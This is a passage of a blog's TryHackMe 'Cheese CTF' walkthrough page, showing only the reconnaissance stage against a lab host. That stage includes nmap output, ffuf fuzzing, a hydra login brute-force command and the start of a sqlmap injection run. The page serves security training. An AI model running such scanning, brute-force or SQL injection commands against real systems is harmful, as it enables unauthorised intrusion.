<!DOCTYPE html>
<html lang="en" dir="ltr">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <title>Cheese CTF | THM Writeup :: CyberJagadeesh - Learn Cyber Security</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta
  name="description"
  content="Introduction Detailed walkthroughs for Cheese CTF CTF challenges on TryHackMe .
Initial Foothold echo &#34;10.10.16.91 cheese.thm&#34; &gt;&gt; /etc/hosts Mappped the ip to domain certain-doom.thm.
nmap nmap results Initial scan gives result as lot (n) number of ports open. May be they are tricking us not to look for what we want.
$ nmap cheese.thm -sC -sC -p22,80 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-29 22:48 IST Nmap scan report for cheese.thm (10.10.16.91) Host is up (0.16s latency). PORT STATE SERVICE 22/tcp open ssh | ssh-hostkey: | 3072 b1:c1:22:9f:11:10:5f:64:f1:33:72:70:16:3c:80:06 (RSA) | 256 6d:33:e3:bd:70:62:59:93:4d:ab:8b:fe:ef:e8:a7:b2 (ECDSA) |_ 256 89:2e:17:84:ed:48:7a:ae:d9:8c:9b:a5:8e:24:04:bd (ED25519) 80/tcp open http |_http-title: The Cheese Shop Nmap done: 1 IP address (1 host up) scanned in 6.13 seconds I&rsquo;ve confirmed that port 22 and port 80 are open.
"
/>
<meta
  name="keywords"
  content="cyber security, penetration testing, ethical hacking, vulnerability assessment, network security, application security, web application security, security testing, red teaming, bug bounty, CTFs, cybersecurity challenges, hacking tutorials, security tools, exploit development, reverse engineering, penetration tester, security researcher, security analyst, information security, digital forensics, incident response, threat intelligence, security awareness, social engineering, phishing, malware analysis, cryptography, cloud security, IoT security, mobile security, how to become a penetration tester, penetration testing tools, CTF challenges for beginners, web application penetration testing, network penetration testing, exploit development tutorial, reverse engineering techniques, bug bounty hunting tips, security research projects, cyber security certifications"
/>
<meta name="robots" content="noodp" /><link rel="manifest" href="/manifest.json" /><meta property="og:url" content="http://localhost:1313/posts/cheesectf/writeup/">
  <meta property="og:site_name" content="CyberJagadeesh">
  <meta property="og:title" content="Cheese CTF | THM Writeup">
  <meta property="og:description" content="Introduction Detailed walkthroughs for Cheese CTF CTF challenges on TryHackMe .
Initial Foothold echo &#34;10.10.16.91 cheese.thm&#34; &gt;&gt; /etc/hosts Mappped the ip to domain certain-doom.thm.
nmap nmap results Initial scan gives result as lot (n) number of ports open. May be they are tricking us not to look for what we want.
$ nmap cheese.thm -sC -sC -p22,80 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-29 22:48 IST Nmap scan report for cheese.thm (10.10.16.91) Host is up (0.16s latency). PORT STATE SERVICE 22/tcp open ssh | ssh-hostkey: | 3072 b1:c1:22:9f:11:10:5f:64:f1:33:72:70:16:3c:80:06 (RSA) | 256 6d:33:e3:bd:70:62:59:93:4d:ab:8b:fe:ef:e8:a7:b2 (ECDSA) |_ 256 89:2e:17:84:ed:48:7a:ae:d9:8c:9b:a5:8e:24:04:bd (ED25519) 80/tcp open http |_http-title: The Cheese Shop Nmap done: 1 IP address (1 host up) scanned in 6.13 seconds I’ve confirmed that port 22 and port 80 are open.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-09-30T20:29:01+05:30">
    <meta property="article:modified_time" content="2024-09-30T20:29:01+05:30">
    <meta property="article:tag" content="Ffuf">
    <meta property="article:tag" content="Suid">
    <meta property="article:tag" content="Ssh-Keygen">
    <meta property="article:tag" content="Sqlmap">
    <meta property="article:tag" content="Xxd">
    <meta property="article:tag" content="Systemd.timer">
      <meta property="og:see_also" content="http://localhost:1313/posts/thm/rabbitstore/writeup/">
      <meta property="og:see_also" content="http://localhost:1313/posts/thm/light/writeup/">
      <meta property="og:see_also" content="http://localhost:1313/posts/thm/smol/writeup/">
      <meta property="og:see_also" content="http://localhost:1313/posts/thm/backtrack/writeup/">
      <meta property="og:see_also" content="http://localhost:1313/posts/block/writeup/">
      <meta property="og:see_also" content="http://localhost:1313/posts/pyrat/writeup/">
      <meta property="og:see_also" content="http://localhost:1313/posts/thelondonbridge/writeup/">


  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Cheese CTF | THM Writeup">
  <meta name="twitter:description" content="Introduction Detailed walkthroughs for Cheese CTF CTF challenges on TryHackMe .
Initial Foothold echo &#34;10.10.16.91 cheese.thm&#34; &gt;&gt; /etc/hosts Mappped the ip to domain certain-doom.thm.
nmap nmap results Initial scan gives result as lot (n) number of ports open. May be they are tricking us not to look for what we want.
$ nmap cheese.thm -sC -sC -p22,80 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-29 22:48 IST Nmap scan report for cheese.thm (10.10.16.91) Host is up (0.16s latency). PORT STATE SERVICE 22/tcp open ssh | ssh-hostkey: | 3072 b1:c1:22:9f:11:10:5f:64:f1:33:72:70:16:3c:80:06 (RSA) | 256 6d:33:e3:bd:70:62:59:93:4d:ab:8b:fe:ef:e8:a7:b2 (ECDSA) |_ 256 89:2e:17:84:ed:48:7a:ae:d9:8c:9b:a5:8e:24:04:bd (ED25519) 80/tcp open http |_http-title: The Cheese Shop Nmap done: 1 IP address (1 host up) scanned in 6.13 seconds I’ve confirmed that port 22 and port 80 are open.">


<link rel="canonical" href="http://localhost:1313/posts/cheesectf/writeup/" />

<link rel="shortcut icon" href="/favicon.ico" />
<link rel="stylesheet" href="/css/index.5287fd9d41d8a879613a40ae3cfd190b68c27952b809c28ce66a58d6c634d0cb.css">





      <script async src="https://www.googletagmanager.com/gtag/js?id=G-376DY6PW0W"></script>
      <script>
        var doNotTrack = false;
        if ( false ) {
          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
          var doNotTrack = (dnt == "1" || dnt == "yes");
        }
        if (!doNotTrack) {
          window.dataLayer = window.dataLayer || [];
          function gtag(){dataLayer.push(arguments);}
          gtag('js', new Date());
          gtag('config', 'G-376DY6PW0W');
        }
      </script>




  
  <script type="application/ld+json">
  {"@context":"https://schema.org","@type":"Article","author":{"@type":"Person","name":"CyberJagadeesh"},"dateModified":"2024-09-30T20:29:01+05:30","datePublished":"2024-09-30T20:29:01+05:30","description":"Introduction Detailed walkthroughs for Cheese CTF CTF challenges on TryHackMe .\nInitial Foothold echo \u0026#34;10.10.16.91 cheese.thm\u0026#34; \u0026gt;\u0026gt; /etc/hosts Mappped the ip to domain certain-doom.thm.\nnmap nmap results Initial scan gives result as lot (n) number of ports open. May be they are tricking us not to look for what we want.\n$ nmap cheese.thm -sC -sC -p22,80 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-29 22:48 IST Nmap scan report for cheese.thm (10.10.16.91) Host is up (0.16s latency). PORT STATE SERVICE 22/tcp open ssh | ssh-hostkey: | 3072 b1:c1:22:9f:11:10:5f:64:f1:33:72:70:16:3c:80:06 (RSA) | 256 6d:33:e3:bd:70:62:59:93:4d:ab:8b:fe:ef:e8:a7:b2 (ECDSA) |_ 256 89:2e:17:84:ed:48:7a:ae:d9:8c:9b:a5:8e:24:04:bd (ED25519) 80/tcp open http |_http-title: The Cheese Shop Nmap done: 1 IP address (1 host up) scanned in 6.13 seconds I\u0026rsquo;ve confirmed that port 22 and port 80 are open.\n","image":"/posts/cheesectf/cheeseCTF.png","name":"Cheese CTF | THM Writeup","url":"http://localhost:1313/posts/cheesectf/writeup/"}
</script>

</head>
<body class="flex flex-col min-h-screen w-full bg-slate-50 dark:bg-gray-800">
    
<div class="fixed right-0 top-0 z-50 flex items-center justify-center bg-gray-200 p-2 text-sm uppercase text-black sm:bg-red-200 md:bg-yellow-200 lg:bg-green-200 xl:bg-blue-200 2xl:bg-pink-200">
  <span class="block sm:hidden">all</span>
  <span class="hidden sm:block md:hidden">sm</span>
  <span class="hidden md:block lg:hidden">md</span>
  <span class="hidden lg:block xl:hidden">lg</span>
  <span class="hidden xl:block 2xl:hidden">xl</span>
  <span class="hidden 2xl:block">2xl</span>
</div>

  <header class="flex flex-none justify-center z-10">
    <div class="flex flex-row gap justify-between w-full max-w-4xl lg:max-w-5xl h-12 mt-3">
  <div class="flex-none ml-2 md:ml-0">
    <a href="/" class="">
      <img class="h-12 w-12 rounded-full object-cover bg-gray-100" src="/logo.png" alt="logo">
    </a>
  </div>
  <div class="flex-1"></div>
  <div class="flex-none">
    



<nav class="h-full static">
  <button id="navbar-menu-toggle" type="button" class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg md:hidden" aria-controls="navbar-menu" aria-expanded="false">
    <span class="sr-only">Open main menu</span>
    <i class="w-8 h-8">
      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu-2" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M4 6l16 0" />
  <path d="M4 12l16 0" />
  <path d="M4 18l16 0" />
</svg>

    </i>
  </button>
  <div class="absolute md:static top-16 left-0 right-0 z-50 hidden w-full md:block md:w-auto" id="navbar-menu">
    <ul class="flex flex-col mx-2 md:mx-0 md:flex-row md:border-0 rounded-sm md:rounded-full px-3 text-base font-medium text-slate-800 dark:text-slate-200 shadow-lg bg-white dark:bg-gray-600 shadow-slate-800/5 dark:shadow-slate-200/5 ring-1 ring-slate-900/5 dark:ring-slate-100/5">
    
        <li id="about" class="">
          <a class="block px-3 py-3 hover:text-emerald-600"
            href="/about/" title="About">About</a>
        </li>
      
    
        <li id="post" class="">
          <a class="block px-3 py-3 hover:text-emerald-600 text-emerald-600"
            href="/posts/" title="Post">Post</a>
        </li>
      
    
    </ul>
  </div>
</nav>


  </div>
  
  <div class="flex-none mx-1"></div>
  
  <div class="flex-none md:hidden">
    <a href=/search/ class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg" aria-controls="navbar-menu" aria-expanded="false">
      <span class="sr-only">Search</span>
      <i class="w-8 h-8">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
    <path stroke="none" d="M0 0h24v24H0z" fill="none" />
    <path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" />
    <path d="M21 21l-6 -6" />
</svg>

      </i>
    </a>
  </div>
  <div class="darkmode-toggle flex flex-none mr-2 md:mr-0">
    <label for="darkmode-toggle" class="flex items-center px-3 cursor-pointer rounded-full bg-gray-100 dark:bg-gray-600" title="Toggle dark mode">
      <input name="darkmode-toggle" id="darkmode-toggle" type="checkbox" class="sr-only peer" aria-label="Toggle dark mode">
      <div class="group flex flex-row gap-1 justify-center h-8 px-1 rounded-full bg-white dark:bg-gray-700">
        <i class="h-6 w-6 flex-none rounded-full bg-yellow-400 place-self-center peer-checked:group-[]:invisible">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brightness-down" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M12 12m-3 0a3 3 0 1 0 6 0a3 3 0 1 0 -6 0"></path>
   <path d="M12 5l0 .01"></path>
   <path d="M17 7l0 .01"></path>
   <path d="M19 12l0 .01"></path>
   <path d="M17 17l0 .01"></path>
   <path d="M12 19l0 .01"></path>
   <path d="M7 17l0 .01"></path>
   <path d="M5 12l0 .01"></path>
   <path d="M7 7l0 .01"></path>
</svg>

        </i>
        <i class="h-6 w-6 flex-none rounded-full place-self-center invisible peer-checked:group-[]:visible">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-moon-stars" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z"></path>
   <path d="M17 4a2 2 0 0 0 2 2a2 2 0 0 0 -2 2a2 2 0 0 0 -2 -2a2 2 0 0 0 2 -2"></path>
   <path d="M19 11h2m-1 -1v2"></path>
</svg>

        </i>
      </div>
    </label>
  </div>
</div>

  </header>
  <main class="flex flex-auto justify-center">
    
<div class="w-full max-w-4xl lg:max-w-5xl">
  <div class="flex flex-col mt-6 mx-2 md:mx-0 rounded-lg overflow-hidden shadow-md bg-white dark:bg-gray-700">
    <div>
      <a href="/posts/cheesectf/writeup/">
        <figure>
    <img class="w-full object-cover h-36 md:h-48 xl:h-60" src="/posts/cheesectf/cheeseCTF.png"
      alt="Cheese CTF | THM Writeup" title="Cheese CTF | THM Writeup"
      loading="lazy"
    >
  </figure>
      </a>
    </div>
    <div class="flex flex-col gap-y-3 p-6">
      <h1 class="text-4xl font-semibold text-slate-800 dark:text-slate-100">
        <a href="/posts/cheesectf/writeup/">Cheese CTF | THM Writeup</a>
      </h1>

      
      
  <ul class="flex flex-row flex-wrap text-slate-500 dark:text-slate-300">
    
      
      <li>
        <a href="/categories/ctf/"
          class="text-sm mr-2 px-2 py-1 rounded border border-emerald-800 bg-emerald-800 text-slate-50">
          CTF
        </a>
      </li>
      
    
    
      
      <li>
        <a href="/tags/ffuf/"
          class="flex flex-row text-sm mr-2 py-1">
          <i class="h-5 w-5 flex-none">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M5 9l14 0"></path>
   <path d="M5 15l14 0"></path>
   <path d="M11 4l-4 16"></path>
   <path d="M17 4l-4 16"></path>
</svg>

          </i>
          <span class="ml-0">Ffuf</span>
        </a>
      </li>
      
      <li>
        <a href="/tags/suid/"
          class="flex flex-row text-sm mr-2 py-1">
          <i class="h-5 w-5 flex-none">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M5 9l14 0"></path>
   <path d="M5 15l14 0"></path>
   <path d="M11 4l-4 16"></path>
   <path d="M17 4l-4 16"></path>
</svg>

          </i>
          <span class="ml-0">Suid</span>
        </a>
      </li>
      
      <li>
        <a href="/tags/ssh-keygen/"
          class="flex flex-row text-sm mr-2 py-1">
          <i class="h-5 w-5 flex-none">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M5 9l14 0"></path>
   <path d="M5 15l14 0"></path>
   <path d="M11 4l-4 16"></path>
   <path d="M17 4l-4 16"></path>
</svg>

          </i>
          <span class="ml-0">Ssh-Keygen</span>
        </a>
      </li>
      
      <li>
        <a href="/tags/sqlmap/"
          class="flex flex-row text-sm mr-2 py-1">
          <i class="h-5 w-5 flex-none">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M5 9l14 0"></path>
   <path d="M5 15l14 0"></path>
   <path d="M11 4l-4 16"></path>
   <path d="M17 4l-4 16"></path>
</svg>

          </i>
          <span class="ml-0">Sqlmap</span>
        </a>
      </li>
      
      <li>
        <a href="/tags/xxd/"
          class="flex flex-row text-sm mr-2 py-1">
          <i class="h-5 w-5 flex-none">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M5 9l14 0"></path>
   <path d="M5 15l14 0"></path>
   <path d="M11 4l-4 16"></path>
   <path d="M17 4l-4 16"></path>
</svg>

          </i>
          <span class="ml-0">Xxd</span>
        </a>
      </li>
      
      <li>
        <a href="/tags/systemd.timer/"
          class="flex flex-row text-sm mr-2 py-1">
          <i class="h-5 w-5 flex-none">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M5 9l14 0"></path>
   <path d="M5 15l14 0"></path>
   <path d="M11 4l-4 16"></path>
   <path d="M17 4l-4 16"></path>
</svg>

          </i>
          <span class="ml-0">Systemd.timer</span>
        </a>
      </li>
      
      <li>
        <a href="/tags/lfi/"
          class="flex flex-row text-sm mr-2 py-1">
          <i class="h-5 w-5 flex-none">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M5 9l14 0"></path>
   <path d="M5 15l14 0"></path>
   <path d="M11 4l-4 16"></path>
   <path d="M17 4l-4 16"></path>
</svg>

          </i>
          <span class="ml-0">LFI</span>
        </a>
      </li>
      
      <li>
        <a href="/tags/lfi2rce/"
          class="flex flex-row text-sm mr-2 py-1">
          <i class="h-5 w-5 flex-none">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M5 9l14 0"></path>
   <path d="M5 15l14 0"></path>
   <path d="M11 4l-4 16"></path>
   <path d="M17 4l-4 16"></path>
</svg>

          </i>
          <span class="ml-0">Lfi2rce</span>
        </a>
      </li>
      
      <li>
        <a href="/tags/curl/"
          class="flex flex-row text-sm mr-2 py-1">
          <i class="h-5 w-5 flex-none">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M5 9l14 0"></path>
   <path d="M5 15l14 0"></path>
   <path d="M11 4l-4 16"></path>
   <path d="M17 4l-4 16"></path>
</svg>

          </i>
          <span class="ml-0">Curl</span>
        </a>
      </li>
      
    
    
      
      <li>
        <a href="/series/tryhackme/"
          class="flex flex-row text-sm mr-2 py-1">
          <i class="h-5 w-5 flex-none">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M5 9l14 0"></path>
   <path d="M5 15l14 0"></path>
   <path d="M11 4l-4 16"></path>
   <path d="M17 4l-4 16"></path>
</svg>

          </i>
          <span class="ml-0">Tryhackme</span>
        </a>
      </li>
      
    
    
      
      <li>
        <a href="/platforms/linux/"
          class="flex flex-row text-sm mr-2 py-1">
          <i class="h-5 w-5 flex-none">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M5 9l14 0"></path>
   <path d="M5 15l14 0"></path>
   <path d="M11 4l-4 16"></path>
   <path d="M17 4l-4 16"></path>
</svg>

          </i>
          <span class="ml-0">Linux</span>
        </a>
      </li>
      
    
    
      
      <li>
        <a href="/levels/easy/"
          class="flex flex-row text-sm mr-2 py-1">
          <i class="h-5 w-5 flex-none">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M5 9l14 0"></path>
   <path d="M5 15l14 0"></path>
   <path d="M11 4l-4 16"></path>
   <path d="M17 4l-4 16"></path>
</svg>

          </i>
          <span class="ml-0">Easy</span>
        </a>
      </li>
      
    
    
  </ul>



      <div class="flex flex-col gap-y-1 md:flex-row md:gap-y-0 md:gap-x-4 text-slate-500 dark:text-slate-300">
  
  
  <div class="flex flex-row text-base gap-x-1">
    <i class="h-6 w-6 flex-none">
      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M4 7a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2v-12z"></path>
   <path d="M16 3v4"></path>
   <path d="M8 3v4"></path>
   <path d="M4 11h16"></path>
   <path d="M11 15h1"></path>
   <path d="M12 15v3"></path>
</svg>

    </i>
    <time datetime="2024-09-30T20:29:01&#43;05:30">
      2024-09-30
    </time>
  </div>

  <div class="flex flex-row text-base gap-x-1">
    <i class="h-6 w-6 flex-none">
      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hourglass-high" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M6.5 7h11"></path>
   <path d="M6 20v-2a6 6 0 1 1 12 0v2a1 1 0 0 1 -1 1h-10a1 1 0 0 1 -1 -1z"></path>
   <path d="M6 4v2a6 6 0 1 0 12 0v-2a1 1 0 0 0 -1 -1h-10a1 1 0 0 0 -1 1z"></path>
</svg>

    </i>
    <span>
      12 minutes to read
    </span>
  </div>
</div>


      
        
        <section class="prose prose-slate dark:prose-invert w-full max-w-4xl lg:max-w-5xl mt-6">
          <h2>Table of Contents</h2>
          <aside><nav id="TableOfContents">
  <ul>
    <li><a href="#introduction">Introduction</a></li>
    <li><a href="#initial-foothold">Initial Foothold</a>
      <ul>
        <li><a href="#nmap">nmap</a></li>
        <li><a href="#webserver--port-80">Webserver : port 80</a></li>
        <li><a href="#ffuf">ffuf</a></li>
        <li><a href="#hydra">hydra</a></li>
        <li><a href="#capture-service-banner">Capture Service Banner</a></li>
        <li><a href="#sqlmap">sqlmap</a></li>
      </ul>
    </li>
    <li><a href="#shell-as-comte">Shell as comte</a>
      <ul>
        <li><a href="#linpeas">linpeas</a></li>
        <li><a href="#ssh-keygen">ssh-keygen</a></li>
      </ul>
    </li>
    <li><a href="#privilege-escalation">Privilege Escalation</a>
      <ul>
        <li><a href="#systemdtimer-cronjob">systemd.timer <del>cronjob</del></a></li>
        <li><a href="#suid-xxd">SUID (xxd)</a></li>
      </ul>
    </li>
    <li><a href="#extras">Extras</a></li>
  </ul>
</nav></aside>
        </section>
        
      

      <article class="mt-6 w-full max-w-4xl lg:max-w-5xl prose prose-slate dark:prose-invert prose-quoteless post-content">
        <h2 id="introduction">Introduction</h2>
<p>Detailed walkthroughs for <a href="https://tryhackme.com/r/room/cheesectfv10" target="_blank" rel="noopener">Cheese CTF</a>
 CTF challenges on <a href="https://tryhackme.com" target="_blank" rel="noopener">TryHackMe</a>
.</p>
<h2 id="initial-foothold">Initial Foothold</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;10.10.16.91 cheese.thm&#34;</span> &gt;&gt; /etc/hosts
</span></span></code></pre></div><p>Mappped the ip to domain <code>certain-doom.thm</code>.</p>
<h3 id="nmap">nmap</h3>




<figure>
    <img src="/posts/cheesectf/3.png" title="nmap results" style="display: block; margin: 0 auto;">
    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
        <strong>nmap results</strong>
    </figcaption>  
</figure>

<p>Initial scan gives result as lot (n) number of ports open. May be they are tricking us not to look for what we want.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nmap cheese.thm -sC -sC -p22,80
</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-09-29 22:48 IST
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> cheese.thm <span class="o">(</span>10.10.16.91<span class="o">)</span>
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.16s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
</span></span><span class="line"><span class="cl">22/tcp open  ssh
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> b1:c1:22:9f:11:10:5f:64:f1:33:72:70:16:3c:80:06 <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 6d:33:e3:bd:70:62:59:93:4d:ab:8b:fe:ef:e8:a7:b2 <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 89:2e:17:84:ed:48:7a:ae:d9:8c:9b:a5:8e:24:04:bd <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp open  http
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: The Cheese Shop
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 6.13 seconds
</span></span></code></pre></div><p>I&rsquo;ve confirmed that <code>port 22</code> and <code>port 80</code> are open.</p>
<h3 id="webserver--port-80">Webserver : port 80</h3>
<p>



<figure>
    <img src="/posts/cheesectf/1.png" title="Cheese Shop: Home page" style="display: block; margin: 0 auto;">
    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
        <strong>Cheese Shop: Home page</strong>
    </figcaption>  
</figure>

We got a simple home page for Cheese shop.</p>
<p>



<figure>
    <img src="/posts/cheesectf/2.png" title="Cheese Shop: Login page" style="display: block; margin: 0 auto;">
    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
        <strong>Cheese Shop: Login page</strong>
    </figcaption>  
</figure>

Site also have a login page.</p>
<h3 id="ffuf">ffuf</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ffuf -c -u http://cheese.thm/FUZZ -w /usr/share/wordlists/dirb/big.txt -e .php
</span></span><span class="line"><span class="cl">images                  <span class="o">[</span>Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 156ms<span class="o">]</span>
</span></span><span class="line"><span class="cl">login.php               <span class="o">[</span>Status: 200, Size: 834, Words: 220, Lines: 29, Duration: 144ms<span class="o">]</span>
</span></span></code></pre></div><p>Login.php found.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> ffuf -c -u http://thecheeseshop.com/  -H <span class="s2">&#34;HOST: FUZZ.thecheeseshop.com&#34;</span> -w /usr/share/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt -fs <span class="m">1759</span>
</span></span></code></pre></div><p>Enumarating subdoamins failed.</p>
<h3 id="hydra">hydra</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hydra -L /usr/share/SecLists-master/Usernames/Names/names.txt -p testPassword cheese.thm http-post-form <span class="s2">&#34;/login.php:username=^USER^&amp;password=^PASS^:Login failed. Please check your username and password.&#34;</span>
</span></span></code></pre></div><p>Enumaration for usernames failed.</p>
<h3 id="capture-service-banner">Capture Service Banner</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="k">for</span> i in <span class="k">$(</span>cat ports.txt<span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> port <span class="nv">$i</span> <span class="k">$(</span>timeout <span class="m">3</span> nc cheese.thm <span class="nv">$i</span><span class="k">)</span> &gt;&gt; ncOutput.txt <span class="p">;</span> <span class="k">done</span><span class="p">;</span>
</span></span></code></pre></div><p>Running this command to get the banner of all open ports. We can use this later if required.</p>
<h3 id="sqlmap">sqlmap</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sqlmap -u http://cheese.thm/login.php --data <span class="s2">&#34;username=admin&amp;password=adminpassword&#34;</span>                                                                     
</span></span><span class="line"><span class="cl">       ___
</span></span><span class="line"><span class="cl">      __H__                                                                                                                                                 
</span></span><span class="line"><span class="cl">___ ___<span class="o">[</span>,<span class="o">]</span>_____ ___ ___  <span class="o">{</span>1.8.8#stable<span class="o">}</span>                                                                                                                     
